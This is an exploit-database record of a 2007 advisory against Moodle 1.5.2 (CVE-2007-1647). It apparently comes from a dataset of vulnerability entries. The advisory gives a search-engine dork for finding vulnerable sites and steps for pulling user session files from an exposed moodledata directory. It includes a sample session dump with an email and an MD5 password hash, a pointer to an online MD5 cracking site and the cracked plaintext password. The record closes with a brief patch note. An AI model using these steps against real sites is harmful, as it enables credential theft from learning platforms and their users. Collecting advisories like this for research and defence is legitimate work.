{
  "id": "3508",
  "title": "Moodle 1.5.2 - &#039;moodledata&#039; Remote Session Disclosure",
  "cve": "CVE-2007-1647",
  "vuln_type": "rce",
  "code": "--/ INTRODUCTION  --\r\n\r\n\r\n/*\r\n *\r\n * Advisory           : MOODLE <= 1.5.2 user password read out\r\n * Release Date       : 17. March 2007\r\n * Application        : Moodle.org is a course management system (CMS) \r\n *\t\t      :\tto help educators create effective online learning communities.\r\n * Impact             : read out user account passwords in md5 hash\r\n * Googledork\t      : \"inurl:moodledata\"\r\n * Author             : xSh[at]overclock.ch\r\n *\r\n */\r\n\r\n\r\n--/    SUMMARY    --\r\n\r\nMoodle is a course management system (CMS) - a free, Open Source \r\nsoftware package designed using sound pedagogical principles, to \r\nhelp educators create effective online learning communities. You \r\ncan download and use it on any computer you have handy (including \r\nwebhosts), yet it can scale from a single-teacher site to a \r\n50,000-student University. (www.moodle.org)\r\n\r\n\r\n--/   REPRODUCE   --\r\n\r\nThe moodle CMS is located at 'www.TARGET.com/moodle' and the moodle\r\ndatabase at 'www.TARGET.com/moodledata' including uploads, temp and\r\nsession files. We're interested to get the session files, created \r\nby each user:\r\n\r\nhttp://www.TARGET.com/moodledata/sessions/\r\n\r\nFilename:\r\n\r\nsess_280c9fca6458bf24277cf03c45d2a770\r\n\r\nContent: (> 2KB)\r\n\r\nSESSION|O:6:\"object\":12:{s:12:\"session_test\";s:10:\"zN0PiMhwWK\";s:8:\"encoding\";\r\ns:10:\"iso-8859-1\";s:7:\"fromurl\";s:69:\"http://www.TARGET.com/moodle/mod/forum/\r\nview.php?id=100\";s:10:\"logincount\";i:1;s:18:\"cal_course_referer\";i:0;s:15:\"cal\r\n_show_global\";b:1;s:15:\"cal_show_groups\";b:1;s:15:\"cal_show_course\";b:1;s:13:\"\r\ncal_show_user\";b:1;s:17:\"cal_courses_shown\";a:2:{i:1;b:1;i:9;b:1;}s:15:\"cal_u\r\nsers_shown\";s:2:\"86\";s:14:\"fromdiscussion\";s:64:\"http://www.TARGET.com/moodle/\r\ncourse/view.php?id=9\";}USER|O:8:\"stdClass\":94:{i:0;s:2:\"86\";s:2:\"id\";s:2:\"86\";\r\ni:1;s:5:\"email\";s:4:\"auth\";s:5:\"email\";i:2;s:1:\"1\";s:9:\"confirmed\";s:1:\"1\";i:\r\n3;s:1:\"0\";s:12:\"policyagreed\";s:1:\"0\";i:4;s:1:\"0\";s:7:\"deleted\";s:1:\"0\";i:5;s:\r\n33:\"victim@target.com\";s:8:\"username\";s:33:\"victim@target.com\";i:6;s:32:\"bb07c\r\n989b57c25fd7e53395c3e118185\";s:8:\"password\";s:32:\"bb07c989b57c25fd7e53395c3e118185\";\r\ni:7;N;s:8:\"idnumber\";N;i:8;s:9:\"Victim\";s:9:\"firstname\";s:9:\"Victim\";i:9;s:5:\r\n\"Victim\";s:8:\"lastname\";s:5:\"Victim\";i:10;s:33:\"victim@target.com\";s:5:\"email\";\r\n\r\n\r\nIn cryptography, MD5 (Message-Digest algorithm 5) is a widely-used cryptographic \r\nhash function with a 128-bit hash value. (md5 online crack: http://gdataonline.com)\r\n\r\nPassword (md5 string) = bb07c989b57c25fd7e53395c3e118185\r\nPassword (plain text) = Claudia\r\n\r\n\r\n--     PATCH     /--\r\n\r\nDon't allow Directory listing. There are no other possibilities actually as far as I know.\r\n\r\n# milw0rm.com [2007-03-18]",
  "url": "https://www.exploit-db.com/exploits/3508"
}